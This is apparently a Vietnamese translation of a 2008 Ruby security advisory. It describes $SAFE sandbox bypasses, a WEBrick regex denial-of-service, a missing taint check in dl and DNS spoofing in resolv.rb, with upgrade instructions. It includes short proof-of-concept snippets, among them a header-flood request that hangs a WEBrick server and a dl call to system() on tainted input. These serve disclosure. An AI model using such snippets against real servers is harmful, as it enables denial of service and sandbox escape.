---
layout: news_post
title: "Nhiều lỗ hổng trong Ruby"
author: "Shugo Maeda"
lang: vi
---

Nhiều lỗ hổng đã được phát hiện trong Ruby. Khuyến nghị bạn nâng cấp
lên các phiên bản mới nhất.

## Chi tiết

Các lỗ hổng sau đã được phát hiện.

### Một số lỗ hổng trong mức an toàn

Một số lỗ hổng trong mức an toàn đã được phát hiện.

* untrace\_var được phép ở mức an toàn 4.

      trace_var(:$VAR) {|val| puts "$VAR = #{val}" }

      Thread.new do
       $SAFE = 4
       eval %q{
         proc = untrace_var :$VAR
         proc.first.call("aaa")
       }
      end.join

* $PROGRAM\_NAME có thể bị sửa đổi ở mức an toàn 4.

      Thread.new do
       $SAFE = 4
       eval %q{$PROGRAM_NAME.replace "Hello, World!"}
      end.join

      $PROGRAM_NAME #=> "Hello, World!"

* Các phương thức không an toàn có thể được gọi ở mức an toàn 1-3.

      class Hello
       def world
         Thread.new do
           $SAFE = 4
           msg = "Hello, World!"
           def msg.size
             self.replace self*10 # replace string
             1 # return wrong size
           end
           msg
         end.value
       end
      end

      $SAFE = 1 # or 2, or 3
      s = Hello.new.world
      if s.kind_of?(String)
       puts s if s.size < 20 # print string which size is less than 20
      end

* Các thao tác Syslog được phép ở mức an toàn 4.

      require "syslog"

      Syslog.open

      Thread.new do
       $SAFE = 4
       eval %q{
         Syslog.log(Syslog::LOG_WARNING, "Hello, World!")
         Syslog.mask = Syslog::LOG_UPTO(Syslog::LOG_EMERG)
         Syslog.info("masked")
         Syslog.close
       }
      end.join

Các lỗ hổng này được báo cáo bởi Keita Yamaguchi.

### Lỗ hổng DoS trong WEBrick

WEBrick::HTTP::DefaultFileHandler có lỗi gây ra thời gian xử lý theo
cấp số nhân do biểu thức chính quy quay lui trong
WEBrick::HTTPUtils.split\_header\_value.

Máy chủ có thể bị khai thác:

    require 'webrick'
    WEBrick::HTTPServer.new(:Port => 2000, :DocumentRoot => "/etc").start

Tấn công:

    require 'net/http'
    res = Net::HTTP.start("localhost", 2000) { |http|
      req = Net::HTTP::Get.new("/passwd")
      req['If-None-Match'] = %q{meh=""} + %q{foo="bar" } * 100
      http.request(req)
    }
    p res

Yêu cầu này có thể sẽ không bao giờ hoàn thành.

Lỗ hổng này được báo cáo bởi Christian Neukirchen.

### Thiếu kiểm tra nhiễm trong dl
{: #label-3}

dl không kiểm tra tính nhiễm (taintness), vì vậy nó có thể cho phép kẻ
tấn công gọi các hàm nguy hiểm.

    require 'dl'
    $SAFE = 1
    h = DL.dlopen(nil)
    sys = h.sym('system', 'IP')
    uname = 'uname -rs'.taint
    sys[uname]

Lỗ hổng này được báo cáo bởi sheepman.

### Lỗ hổng giả mạo DNS trong resolv.rb

resolv.rb cho phép kẻ tấn công từ xa giả mạo các câu trả lời DNS. Rủi
ro này có thể được giảm thiểu bằng cách ngẫu nhiên hóa ID giao dịch DNS
và cổng nguồn, vì vậy resolv.rb đã được sửa để ngẫu nhiên hóa chúng.

* xem thêm: [CVE-2008-1447][1]

Lỗ hổng này được báo cáo bởi Tanaka Akira.

## Các phiên bản bị ảnh hưởng

1.8 series
: * 1\.8.5 và tất cả các phiên bản trước đó
  * 1\.8.6-p286 và tất cả các phiên bản trước đó
  * 1\.8.7-p71 và tất cả các phiên bản trước đó

1.9 series
: * r18423 và tất cả các bản sửa đổi trước đó

## Giải pháp

1.8 series
: Vui lòng nâng cấp lên 1.8.6-p287, hoặc 1.8.7-p72.

  * [&lt;URL:https://cache.ruby-lang.org/pub/ruby/1.8/ruby-1.8.6-p287.tar.gz&gt;][2]
  * [&lt;URL:https://cache.ruby-lang.org/pub/ruby/1.8/ruby-1.8.7-p72.tar.gz&gt;][3]

1.9 series

: Vui lòng checkout phiên bản mới nhất bằng Subversion.

      $ svn co https://svn.ruby-lang.org/repos/ruby/trunk ruby

Xin lưu ý rằng gói sửa lỗi này có thể đã có sẵn qua phần mềm quản lý
gói của bạn.

## Ghi nhận

Ghi nhận Keita Yamaguchi, Christian Neukirchen, sheepman, và Tanaka
Akira đã tiết lộ các vấn đề này cho Đội An ninh Ruby.

## Thay đổi

* 2008-08-08 12:21 +09:00 đã sửa số bản sửa đổi của ruby 1.9.
* 2008-08-11 11:23 +09:00 đã sửa patchlevel của ruby 1.8. xem [thông
  báo phát hành Ruby 1.8.7-p72 và 1.8.6-p287][4]



[1]: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1447
[2]: https://cache.ruby-lang.org/pub/ruby/1.8/ruby-1.8.6-p287.tar.gz
[3]: https://cache.ruby-lang.org/pub/ruby/1.8/ruby-1.8.7-p72.tar.gz
[4]: {{ site.url }}/vi/news/2008/08/11/ruby-1-8-7-p72-and-1-8-6-p287-released/
